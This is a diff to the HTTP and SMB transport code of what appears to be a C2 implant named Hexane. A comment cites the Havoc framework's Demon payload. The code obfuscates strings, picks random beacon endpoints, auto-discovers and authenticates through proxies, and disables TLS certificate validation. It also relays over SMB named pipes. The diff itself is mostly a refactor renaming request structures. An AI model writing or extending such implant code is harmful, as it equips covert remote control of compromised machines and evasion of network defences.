@@ -1,7 +1,7 @@
 #include <core/include/network.hpp>
 namespace Http {
 
-    VOID HttpSendRequest(_request *request, _stream **stream) {
+    VOID HttpSendRequest(HINTERNET request, _stream **stream) {
         HEXANE
 
         void *buffer   = { };
@@ -11,7 +11,7 @@ namespace Http {
         uint32_t total = 0;
         uint32_t length = 0;
         do {
-            if (!(Ctx->win32.WinHttpQueryDataAvailable(request->req_handle, R_CAST(LPDWORD, &length)))) {
+            if (!(Ctx->win32.WinHttpQueryDataAvailable(request, R_CAST(LPDWORD, &length)))) {
                 return_defer(ntstatus);
             }
             if (!buffer) {
@@ -42,11 +42,10 @@ namespace Http {
         defer:
     }
 
-    _request* CreateRequestContext() {
+    _request_context* CreateRequestContext() {
         HEXANE
-        // creates global http session for context
 
-        _request *request = R_CAST(_request*, x_malloc(sizeof(_request)));
+        _request_context *req_ctx = R_CAST(_request_context*, x_malloc(sizeof(_request_context)));
         uint32_t n_endpoint = 0;
 
         if (!Ctx->transport.http->handle) {
@@ -55,50 +54,49 @@ namespace Http {
             }
         }
 
-        if (!(request->conn_handle = Ctx->win32.WinHttpConnect(Ctx->transport.http->handle, Ctx->transport.http->address, Ctx->transport.http->port, 0))) {
+        if (!(req_ctx->conn_handle = Ctx->win32.WinHttpConnect(Ctx->transport.http->handle, Ctx->transport.http->address, Ctx->transport.http->port, 0))) {
             return_defer(ntstatus);
         }
 
         n_endpoint          = Utils::Random::RandomNumber32();
-        request->endpoint   = Ctx->transport.http->endpoints[n_endpoint % Ctx->transport.http->n_endpoints];
+        req_ctx->endpoint   = Ctx->transport.http->endpoints[n_endpoint % Ctx->transport.http->n_endpoints];
 
         Ctx->transport.http->flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
         if (Ctx->transport.b_ssl) {
             Ctx->transport.http->flags |= WINHTTP_FLAG_SECURE;
         }
 
-        if (!(request->req_handle = Ctx->win32.WinHttpOpenRequest(request->conn_handle, Ctx->transport.http->method, request->endpoint, nullptr, nullptr, nullptr, Ctx->transport.http->flags))) {
+        if (!(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, Ctx->transport.http->method, req_ctx->endpoint, nullptr, nullptr, nullptr, Ctx->transport.http->flags))) {
             return_defer(ntstatus);
         }
 
         defer:
         if (ntstatus != ERROR_SUCCESS) {
-            if (request) {
-                x_free(request);
+            if (req_ctx) {
+                x_free(req_ctx);
             }
         }
 
-        return request;
+        return req_ctx;
     }
 
-    _proxy_context* CreateProxyContext(_request *request) {
+    _proxy_context* CreateProxyContext(_request_context *req_ctx) {
         HEXANE
 
-        // _proxy_context is a temporary store and can be discarded
         _proxy_context *proxy_ctx = R_CAST(_proxy_context*, x_malloc(sizeof(_proxy_context)));
 
         if (Ctx->transport.b_proxy) {
             proxy_ctx->proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
             proxy_ctx->proxy_info.lpszProxy     = Ctx->transport.http->proxy->address;
 
-            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY, &proxy_ctx->proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
+            if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, &proxy_ctx->proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
                 return_defer(ntstatus);
             }
 
             if (Ctx->transport.http->proxy->username && Ctx->transport.http->proxy->password) {
                 if (
-                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_USERNAME, Ctx->transport.http->proxy->username, x_wcslen(Ctx->transport.http->proxy->username)) ||
-                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->transport.http->proxy->password, x_wcslen(Ctx->transport.http->proxy->password))) {
+                    !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_USERNAME, Ctx->transport.http->proxy->username, x_wcslen(Ctx->transport.http->proxy->username)) ||
+                    !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->transport.http->proxy->password, x_wcslen(Ctx->transport.http->proxy->password))) {
                     return_defer(ntstatus);
                 }
             }
@@ -110,7 +108,7 @@ namespace Http {
             proxy_ctx->autoproxy.dwReserved             = 0;
             proxy_ctx->autoproxy.fAutoLogonIfChallenged = TRUE;
 
-            if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, request->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info)) {
+            if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info)) {
                 Ctx->transport.env_proxylen  = sizeof(WINHTTP_PROXY_INFO);
                 Ctx->transport.env_proxy     = x_malloc(Ctx->transport.env_proxylen);
 
@@ -135,7 +133,7 @@ namespace Http {
                         proxy_ctx->autoproxy.lpszAutoConfigUrl  = proxy_ctx->proxy_config.lpszAutoConfigUrl;
                         proxy_ctx->autoproxy.dwAutoDetectFlags  = 0;
 
-                        Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, request->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info);
+                        Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info);
                         Ctx->transport.env_proxylen  = sizeof(WINHTTP_PROXY_INFO);
 
                         Ctx->transport.env_proxy = x_malloc(Ctx->transport.env_proxylen);
@@ -147,7 +145,7 @@ namespace Http {
         }
 
         if (Ctx->transport.env_proxy) {
-            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY, Ctx->transport.env_proxy, Ctx->transport.env_proxylen)) {
+            if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, Ctx->transport.env_proxy, Ctx->transport.env_proxylen)) {
                 return_defer(ntstatus);
             }
         }
@@ -167,8 +165,8 @@ namespace Http {
         HEXANE
         // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
 
-        _proxy_context *proxy_ctx   = { };
-        _request *request           = { };
+        _proxy_context *proxy_ctx = { };
+        _request_context *req_ctx = { };
 
         wchar_t *header     = { };
         uint32_t status     = 0;
@@ -180,8 +178,8 @@ namespace Http {
         Ctx->transport.http->method = OBFW(L"GET");
 
         if (
-            !(request = CreateRequestContext()) ||
-            !(proxy_ctx = CreateProxyContext(request))) {
+            !(req_ctx = CreateRequestContext()) ||
+            !(proxy_ctx = CreateProxyContext(req_ctx))) {
             return_defer(ntstatus);
         }
 
@@ -191,7 +189,7 @@ namespace Http {
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-            if (!Ctx->win32.WinHttpSetOption(request->req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->transport.http->flags, sizeof(ULONG))) {
+            if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->transport.http->flags, sizeof(ULONG))) {
                 return_defer(ntstatus);
             }
         }
@@ -202,7 +200,7 @@ namespace Http {
                 else {
 
                     header = Ctx->transport.http->headers[n_headers];
-                    if (!Ctx->win32.WinHttpAddRequestHeaders(request->req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
+                    if (!Ctx->win32.WinHttpAddRequestHeaders(req_ctx->req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
                         return_defer(ntstatus);
                     }
 
@@ -210,27 +208,26 @@ namespace Http {
                 }
             }
         }
-
         if (
-            !Ctx->win32.WinHttpSendRequest(request->req_handle, nullptr, 0, out->buffer, out->length, out->length, 0) ||
-            !Ctx->win32.WinHttpReceiveResponse(request->req_handle, nullptr)) {
+            !Ctx->win32.WinHttpSendRequest(req_ctx->req_handle, nullptr, 0, out->buffer, out->length, out->length, 0) ||
+            !Ctx->win32.WinHttpReceiveResponse(req_ctx->req_handle, nullptr)) {
             return_defer(ntstatus);
         }
 
         if (
-            !Ctx->win32.WinHttpQueryHeaders(request->req_handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, R_CAST(LPDWORD, &n_status), nullptr)) {
+            !Ctx->win32.WinHttpQueryHeaders(req_ctx->req_handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, R_CAST(LPDWORD, &n_status), nullptr)) {
             return_defer(ntstatus);
         }
         if (status != HTTP_STATUS_OK) {
             return_defer(status);
         }
 
-        HttpSendRequest(request, in);
+        HttpSendRequest(req_ctx->req_handle, in);
 
         defer:
-        if (request) {
-            if (request->req_handle) { Ctx->win32.WinHttpCloseHandle(request->req_handle); }
-            if (request->conn_handle) { Ctx->win32.WinHttpCloseHandle(request->conn_handle); }
+        if (req_ctx) {
+            if (req_ctx->req_handle) { Ctx->win32.WinHttpCloseHandle(req_ctx->req_handle); }
+            if (req_ctx->conn_handle) { Ctx->win32.WinHttpCloseHandle(req_ctx->conn_handle); }
         }
         if (proxy_ctx) {
             if (proxy_ctx->proxy_config.lpszProxy) { x_free(proxy_ctx->proxy_config.lpszProxy); }
@@ -357,6 +354,8 @@ namespace Smb {
         while (total < out->length);
         return true;
     }
+
+    // if a parent is assigned more than one child, pipes can be branched?
 
     VOID PeerConnectIngress (_stream *out, _stream **in) {
         HEXANE
